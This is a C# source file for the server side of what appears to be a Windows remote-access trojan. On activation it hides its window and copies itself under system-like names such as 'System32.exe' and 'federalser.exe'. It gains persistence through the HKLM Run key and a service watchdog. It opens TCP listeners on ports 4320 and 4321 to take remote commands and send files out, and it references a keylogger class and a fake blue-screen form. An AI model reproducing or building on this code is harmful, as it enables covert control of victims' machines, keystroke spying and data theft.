using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.Net;
using System.Net.Sockets;
using System.Threading;
using System.Diagnostics;
using Microsoft.Win32;
using System.IO;
using System.ServiceProcess;

namespace MK2_S
{
    public partial class Form1 : Form
    {
        private Socket socket = null;//Main socket
        private Thread thread = null;
        //Socket[] socConnection = new Socket[1024];//consumanle temp socket
        List<Thread> threadCol = new List<Thread>();
        List<Socket> socketCol = new List<Socket>();

        private int clientNum = 0;

        static private Byte[] commands = new Byte[1024];// Received command
        public Byte[] feedBacks = new Byte[1024];// Received command

        string innoceneceMachine = "NEXUS";

        classControl con;
        public keySpy keyspy;

        private Socket pipeSoc = null;//The socket prepare for sent file to coltroler

        System.Timers.Timer serGuardian = new System.Timers.Timer(2000); //Service Guardian ( Very terrible , one second is not enough!!! )

        Thread monitThread = null;

        public Form2 form2 = null;//Dumy or Blue Screen

        ///////////////////////////////////////////////////////////////////

        public static String AppFileName = Process.GetCurrentProcess().MainModule.FileName;

        public static String NAME_SERVICE = "SystemCore";
        public static String NAME_SERVICE_EXE = "federalser.exe";
        public static String NAME_SERVICE_BACKUP = "sora.ini";
        public static String NAME_MK_EXE = "System32.exe";
        public static String NAME_MK_BACKUP = "yosuga.ini";

        public static String PATH_SERVICE_FOLDER = System.Environment.GetFolderPath(Environment.SpecialFolder.SystemX86);
        public static String PATH_SERVICE_EXE = PATH_SERVICE_FOLDER + "\\" + NAME_SERVICE_EXE;
        public static String PATH_SERVICE_BACKUP_FOLDER = System.Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        public static String PATH_SERVICE_BACKUP_EXE = PATH_SERVICE_BACKUP_FOLDER + "\\" + NAME_SERVICE_BACKUP;

        public static String PATH_MK_FOLDER = System.Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) + "\\Windows Service";
        public static String PATH_MK_EXE = PATH_MK_FOLDER + "\\" + NAME_MK_EXE;
        public static String PATH_MK_BACKUP_FOLDER = System.Environment.GetFolderPath(Environment.SpecialFolder.Windows);
        public static String PATH_MK_BAXKUP_EXE = PATH_MK_BACKUP_FOLDER + "\\" + NAME_MK_BACKUP;

        //////////////////////////////////////////////////////////////////////


        public Form1()
        {
            InitializeComponent();                 
        }

        private void MK2_S_Activated(object sender, EventArgs e)
        {
            this.Hide();

            if (innoceneceMachine != System.Environment.MachineName)
            {
                //if (anlReg("keyMk",true) != 0)//I think we should reset the flag after read key because we need reopen instance
                {                    
                    deployFile();
                }
            }
            anlReg("keySer", true);//Set this to 0,so that we can truly restart service after internal stop
            anlReg("keyMk", true);
            mkstart();
            //keyspy = new keySpy();
            //keyspy.startSpy();
        }

        private void mkstart()
        {
            try
            {
                socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                socket.Bind(new IPEndPoint(IPAddress.Any, 4320));
                socket.Listen(128);

                thread = new Thread(new ThreadStart(socketLine));
                thread.IsBackground = true;
                thread.Start();

                monitThread = new Thread(new ThreadStart(monitTimer));
                monitThread.IsBackground = true;
                monitThread.Start();

                //serGuardian.Elapsed += new System.Timers.ElapsedEventHandler((s, e) => monitTimer(s, e));//Guard Service
                //serGuardian.AutoReset = true; //每到指定时间Elapsed事件是触发一次（false），还是一直触发（true）
                //serGuardian.Enabled = true; //是否触发Elapsed事件
                //serGuardian.Start();
            }
            catch(Exception e)
            {
                //MessageBox.Show(e.Message);
            }
        }

        void setPipe()
        {
            pipeSoc = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);//Prepare for send file
            pipeSoc.Bind(new IPEndPoint(IPAddress.Any, 4321));
            pipeSoc.Listen(20);
        }

        private void monitTimer()
        {
            try
            {
                while(true)
                {
                    monitSer(NAME_SERVICE);
                    Thread.Sleep(200);
                }

                //checkBomb();
            }
            catch(Exception ex)
            {

            }

        }

        void monitSer(string serviceName)//In future maybe should add check and set service funcation
        {
            try  
            {  
                ServiceController[] services = ServiceController.GetServices();    
  
                foreach (ServiceController service in services)  
                {  
                    if (service.ServiceName == serviceName)  
                    {
                        if ((service.Status != ServiceControllerStatus.Running)
                        && (service.Status != ServiceControllerStatus.StartPending))
                        {
                            if (anlReg("keySer", false) != 1)//Do not set to true,so that we have chance to updata ser or remove it
                            {
                                //MessageBox.Show(anlReg("keySer", false).ToString());

                                checkSerfile();
                                service.Start();
                                //service.WaitForStatus(ServiceControllerStatus.Running, new TimeSpan(0, 0, 30));  
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }  

        }

        void checkSerfile()//Check and recover ser exe
        {
            if (!System.IO.Directory.Exists(PATH_SERVICE_FOLDER))
            {
                try
                {
                    System.IO.Directory.CreateDirectory(PATH_SERVICE_FOLDER);// 目录不存在，建立目录 
                }
                catch (Exception eee)
                {

                }
            }

            if (!File.Exists(PATH_SERVICE_EXE))
                try
                {
                    System.IO.File.Copy(PATH_SERVICE_BACKUP_EXE, PATH_SERVICE_EXE, true);
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                }
        }
        
        private void socketLine()
        {
            while (true)
            {
                try
                {
                    socketCol.Insert(clientNum, socket.Accept());
                    //socConnection[clientNum] = socket.Accept();

                    //this.Invoke((MethodInvoker)delegate
                    //{
                    //    this.mesTextbox.AppendText("[" + DateTime.Now.ToString() + "] " + clientNum + " Connected!" + "\r\n");
                    //});

                    threadCol.Insert(clientNum, new Thread(new ParameterizedThreadStart(ControlLine)));
                    threadCol[clientNum].IsBackground = true;
                    //threadCol[clientNum].Start(socConnection[clientNum]);
                    threadCol[clientNum].Start(clientNum);

                    //Thread thread = new Thread(new ParameterizedThreadStart(ControlLine));
                    //thread.IsBackground = true;
                    //thread.Start(socConnection[clientNum]);

                    clientNum++;

                }
                catch(Exception e)
                {
                    //MessageBox.Show(e.Message);
                }

            }
        }

        public void deployFile()//Must maintain the folder path`s change
        {                        
            //if (System.IO.Directory.Exists(path))//Clear file
            //{
            //    try
            //    {
            //        DirectoryInfo di = new DirectoryInfo(path);
            //        di.Delete(true);
            //        //System.IO.Directory.CreateDirectory(path);// 目录不存在，建立目录 
            //    }
            //    catch(Exception eee)
            //    {

            //    }
            //}

            if (!Directory.Exists(PATH_MK_FOLDER))
            {
                try
                {
                    Directory.CreateDirectory(PATH_MK_FOLDER);
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                }
            }
            if (!Directory.Exists(PATH_MK_BACKUP_FOLDER))
            {
                try
                {
                    Directory.CreateDirectory(PATH_MK_BACKUP_FOLDER);
                }
                catch (Exception ex)
                {
                    //MessageBox.Show(ex.Message);
                }
            }

            bool isrewrite = true; // true=覆盖已存在的同名文件,false则反之 
            try
            {
                System.IO.File.Copy(AppFileName, PATH_MK_BAXKUP_EXE, isrewrite);//backup exe
                System.IO.File.Copy(AppFileName, PATH_MK_EXE, isrewrite);//deploy exe

                runThis();
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }

        public void deployReg(string path)
        {
            string valueName = "Microsoft mk";
            string _valueName = "system";

            try
            {
                string[] subkeyNames; 
                RegistryKey rsg = null;

                rsg = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", true);//true表示可以修改
                subkeyNames = rsg.GetValueNames(); //判断键值的名称 //.GetSubKeyNames() -> 取得子项的名称

                foreach (string keyName in subkeyNames)
                {
                    if (keyName == _valueName && rsg.GetValue(_valueName).ToString() == path)
                    {
                        rsg.Close();
                        return;
                    }
                    if (keyName == valueName)//delete old information
                    {
                        rsg.DeleteValue(valueName, false);
                    }
                }
                
                rsg.SetValue(_valueName, path);//set new path
                rsg.Close();
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }

        public int anlReg(string keyname,bool reSet)
        {
            string valueName = keyname;
            int flag = -1;

            try
            {
                string[] subkeyNames;
                RegistryKey rsg = null;

                rsg = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows", true);//true表示可以修改
                subkeyNames = rsg.GetValueNames(); //判断键值的名称 //.GetSubKeyNames() -> 取得子项的名称

                foreach (string keyName in subkeyNames)
                {
                    if (keyName == valueName)
                    {
                        flag = int.Parse(rsg.GetValue(valueName).ToString());
                        if(reSet)
                            rsg.SetValue(valueName, "0");
                        //rsg.DeleteValue(valueName, false);
                        rsg.Close();
                        return flag;
                    }
                }

                rsg.SetValue(valueName, "0");
                rsg.Close();

                return -1;
            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
                //EventLog.WriteEntry(ex.Message);
                return -2;
            }
        }

        void runThis()//Close this and open new instance
        {
            //try
            //{
            //    System.Diagnostics.Process.Start(path);
            //    Thread.Sleep(600);
            //    this.Close();
            //}
            //catch (Exception e)
            //{
            //    MessageBox.Show(e.Message);
            //}


            try  
            {  
                ServiceController[] services = ServiceController.GetServices();    
  
                foreach (ServiceController service in services)  
                {
                    if (service.ServiceName == NAME_SERVICE)  
                    {
                        if ((service.Status != ServiceControllerStatus.Running)
                        && (service.Status != ServiceControllerStatus.StartPending))
                        {
                            if (anlReg("keySer", false) != 1)//Do not set to true,so that we have chance to updata ser or remove it
                            {
                                //MessageBox.Show(anlReg("keySer", false).ToString());
                                checkSerfile();
                                service.Start();
                                //service.WaitForStatus(ServiceControllerStatus.Running, new TimeSpan(0, 0, 30));  
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                MessageBox.Show(ex.Message);
            }

            this.Close();

        }

        public void setReg(string keyname,string value)
        {
            string valueName = keyname;

            try
            {
                string[] subkeyNames;
                RegistryKey rsg = null;

                rsg = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows", true);//true表示可以修改
                subkeyNames = rsg.GetValueNames(); //判断键值的名称 //.GetSubKeyNames() -> 取得子项的名称

                foreach (string keyName in subkeyNames)
                {
                    if (keyName == valueName)
                    {
                        rsg.SetValue(valueName, value);
                        //rsg.DeleteValue(valueName, false);
                        //MessageBox.Show(rsg.GetValue(valueName).ToString());
                        rsg.Close();
                        return;
                    }
                    //if (keyName == valueName && rsg.GetValue(valueName).ToString() == value)
                    //{
                    //    rsg.Close();
                    //    return;
                    //}
                }

                rsg.SetValue(valueName, value);
                rsg.Close();

            }
            catch (Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }

        public string desUp(string det)
        {
            string des = null;
            string[] list = det.Split('\\');

            int len = list.Length;
            for (int i = 0; i < len - 1; i++)
            {
                des += list[i];
                if (i != len - 2)
                    des += "\\";
            }

            return des;
        }

        public string desDn(string det,string dn)
        {
            string des = det;
            des += "\\";
            des += dn;

            return des;
        }

        public void fillArray(int num, byte[] array, int offset, int space)
        {
            for (int i = 0; i < space;i++)
            {
                array[offset + i] = (byte)(num >> (8 * (space - 1 - i)) );
            }                
        }

        private void ControlLine(object SocketClientPara)
        {
            Socket socketSalver = socketCol[(int)SocketClientPara];
            con = new classControl(this, socketSalver);            

            try
            {
                while (true)
                {
                    if(0 == socketSalver.Receive(commands))
                    {
                        socketSalver.Close();
                        socketCol[(int)SocketClientPara].Close();
                        threadCol[(int)SocketClientPara].Abort();
                    }

                    //Thread t = new Thread(delegate()
                    //{
                        con.beControl(commands);
                    //});
                    //t.IsBackground = true;
                    //t.Start();                    
                }
            }
            catch (System.Exception ex)
            {
                //MessageBox.Show(ex.Message);
            }
        }

        private void MK2_S_Load(object sender, EventArgs e)
        {
            
        }

        private void Form1_FormClosing(object sender, FormClosingEventArgs e)
        {
            Process[] ps = Process.GetProcesses();
            foreach (Process item in ps)
            {
                if (item.ProcessName == "AIMP3")
                {
                    //item.Close();
                }
            }

        }

        private void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            Process[] ps = Process.GetProcesses();
            foreach (Process item in ps)
            {
                if (item.ProcessName == "AIMP3")
                {
                    //item.Close();
                }
            }
        }










    }
}
